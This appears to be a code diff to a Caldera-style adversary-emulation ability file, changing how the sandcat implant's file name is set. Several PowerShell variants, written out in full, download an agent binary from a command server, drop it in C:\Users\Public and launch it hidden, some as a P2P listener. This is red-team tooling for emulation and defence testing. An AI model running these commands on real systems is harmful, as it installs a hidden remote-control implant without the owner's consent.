@@ -89,11 +89,10 @@
           $wc.Headers.add("platform","windows");
           $wc.Headers.add("file","sandcat.go");
           $data=$wc.DownloadData($url);
-          $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
-          get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
-          rm -force "C:\Users\Public\$name.exe" -ea ignore;
-          [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
-          Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+          get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+          rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+          [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+          Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
         variations:
           - description: Deploy as a blue-team agent instead of red
             command: |
@@ -103,11 +102,10 @@
               $wc.Headers.add("platform","windows");
               $wc.Headers.add("file","sandcat.go");
               $data=$wc.DownloadData($url);
-              $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
-              get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
-              rm -force "C:\Users\Public\$name.exe" -ea ignore;
-              [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
-              Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
           - description: Compile red-team agent with a comma-separated list of extensions (requires GoLang).
             command: |
               $server="#{app.contact.http}";
@@ -117,11 +115,10 @@
               $wc.Headers.add("file","sandcat.go");
               $wc.Headers.add("gocat-extensions", "#{agent.extensions}");
               $data=$wc.DownloadData($url);
-              $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
-              get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
-              rm -force "C:\Users\Public\$name.exe" -ea ignore;
-              [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
-              Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
           - description: Deploy as a P2P agent with known peers included in compiled agent
             command: |
               $server="#{app.contact.http}";
@@ -132,8 +129,7 @@
               $wc.Headers.add("gocat-extensions","proxy_http");
               $wc.Headers.add("includeProxyPeers","HTTP");
               $data=$wc.DownloadData($url);
-              $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
-              get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
-              rm -force "C:\Users\Public\$name.exe" -ea ignore;
-              [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
-              Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red -listenP2P -v" -WindowStyle hidden;
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red -listenP2P -v" -WindowStyle hidden;
